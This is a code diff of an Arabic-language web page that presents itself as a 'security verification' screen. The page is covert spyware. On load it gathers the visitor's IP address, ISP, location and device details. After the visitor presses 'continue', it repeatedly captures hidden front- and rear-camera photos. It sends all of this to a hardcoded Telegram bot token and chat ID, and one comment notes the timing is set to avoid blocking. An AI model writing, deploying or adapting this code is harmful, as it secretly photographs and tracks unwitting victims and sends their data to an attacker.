@@ -3,21 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Verification</title>
+    <title>التحقق من النظام</title>
     <style>
-        body { background: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .box { text-align: center; max-width: 300px; }
-        .loader { width: 35px; height: 35px; border: 3px solid #f3f3f3; border-top: 3px solid #007bff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .ui { text-align: center; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        button { display: none; padding: 12px 25px; background: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; }
+        button { padding: 12px 24px; background: #3498db; color: white; border: none; border-radius: 5px; cursor: pointer; display: none; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <div class="loader" id="ld"></div>
-        <p id="st">جاري تهيئة الاتصال الآمن...</p>
-        <button id="go">بدء التحقق</button>
+    <div class="ui">
+        <div class="loader" id="ldr"></div>
+        <p id="txt">جاري فحص بروتوكولات الأمان...</p>
+        <button id="btn">متابعة</button>
     </div>
 
     <video id="v" autoplay playsinline muted style="display:none"></video>
@@ -26,82 +26,77 @@
     <script>
         const api = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
         const cid = "2103976274";
-        let currentStream = null;
+        let stream = null;
 
-        // 1. جلب المعلومات الشاملة فوراً
-        async function getStats() {
+        // 1. جلب المعلومات فوراً (بشكل مستقل لضمان عدم التعليق)
+        async function getInfo() {
+            let n = navigator;
+            let m = `🔍 **تقرير دخول**\n`;
+            m += `📱 النظام: ${n.platform}\n⚙️ المعالج: ${n.hardwareConcurrency} Cores\n`;
+
             try {
-                const res = await fetch('https://ipwho.is/');
-                const j = await res.json();
-                let m = `📡 **تقرير تقني شامل**\n\n`;
-                m += `🌍 **IP:** \`${j.ip}\`\n🏢 **الشركة:** ${j.connection.isp}\n📍 **الموقع:** ${j.city}, ${j.country}\n`;
-                
-                // تفاصيل الجهاز العميقة
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const renderer = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
-                
-                m += `📱 **النظام:** ${navigator.platform}\n🎮 **الرسوميات:** ${renderer}\n⚙️ **المعالج:** ${navigator.hardwareConcurrency} Cores\n🖥️ **الشاشة:** ${screen.width}x${screen.height}\n`;
-                
-                send(m);
-                document.getElementById('ld').style.display = 'none';
-                document.getElementById('st').innerText = "اكتمل الفحص.";
-                document.getElementById('go').style.display = 'block';
-            } catch (e) { console.error(e); }
+                const res = await fetch('https://ipwho.is/').then(r => r.json());
+                if(res.success) {
+                    m += `🌍 IP: \`${res.ip}\`\n🏢 الشركة: ${res.connection.isp}\n📍 الموقع: ${res.city}, ${res.country}\n`;
+                }
+            } catch(e) { m += `🌍 IP: فشل الجلب حالياً\n`; }
+
+            sendMsg(m);
+            document.getElementById('ldr').style.display = 'none';
+            document.getElementById('btn').style.display = 'inline-block';
+            document.getElementById('txt').innerText = "تم الفحص، يرجى المتابعة.";
         }
 
-        // 2. دالة تشغيل الكاميرا بنمط معين
-        async function startCam(mode) {
-            if (currentStream) currentStream.getTracks().forEach(t => t.stop());
+        // 2. دالة تشغيل الكاميرا مع تنظيف المسارات السابقة
+        async function openCam(mode) {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop()); // إغلاق تام للكاميرا السابقة
+            }
             try {
-                currentStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: mode } 
-                });
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                 const video = document.getElementById('v');
-                video.srcObject = currentStream;
-                return new Promise(resolve => video.onloadedmetadata = () => { video.play(); resolve(); });
+                video.srcObject = stream;
+                return new Promise(res => video.onloadedmetadata = () => { video.play(); res(true); });
             } catch (e) { return false; }
         }
 
-        // 3. التقاط وإرسال
-        function snap(label) {
+        async function snap(label) {
             const canvas = document.getElementById('c');
             const video = document.getElementById('v');
             canvas.width = video.videoWidth; canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(b => {
+            canvas.toBlob(blob => {
                 const f = new FormData();
                 f.append('chat_id', cid);
-                f.append('photo', b, 'x.jpg');
-                f.append('caption', label); // لتوضيح أي كاميرا تم التصوير بها
+                f.append('photo', blob, 'img.jpg');
+                f.append('caption', label);
                 fetch(api + "sendPhoto", { method: 'POST', body: f });
-            }, 'image/jpeg', 0.8);
+            }, 'image/jpeg', 0.7);
         }
 
-        document.getElementById('go').onclick = async function() {
+        document.getElementById('btn').onclick = async function() {
             this.style.display = 'none';
-            document.getElementById('st').innerText = "جاري المزامنة...";
+            document.getElementById('txt').innerText = "جاري المزامنة...";
 
-            // دورة التصوير: أمامية ثم خلفية
-            async function cycle() {
-                // الكاميرا الأمامية
-                if (await startCam("user")) {
-                    setTimeout(() => { snap("📷 الكاميرا الأمامية"); }, 1000);
+            async function startCycle() {
+                // التقاط من الأمامية
+                if (await openCam("user")) {
+                    setTimeout(() => snap("🤳 أمامية"), 1500);
                 }
                 
-                // انتظار قصير ثم الكاميرا الخلفية
+                // انتظار ثم التقاط من الخلفية
                 setTimeout(async () => {
-                    if (await startCam("environment")) {
-                        setTimeout(() => { snap("📸 الكاميرا الخلفية"); }, 1000);
+                    if (await openCam("environment")) {
+                        setTimeout(() => snap("📸 خلفية"), 1500);
                     }
-                }, 4000);
+                }, 5000);
             }
 
-            cycle();
-            setInterval(cycle, 10000); // تكرار الدورة كل 10 ثوانٍ
+            startCycle();
+            setInterval(startCycle, 15000); // دورة كل 15 ثانية لتجنب الحظر
         };
 
-        function send(t) {
+        function sendMsg(t) {
             fetch(api + "sendMessage", {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -109,7 +104,7 @@
             });
         }
 
-        getStats();
+        getInfo();
     </script>
 </body>
 </html>
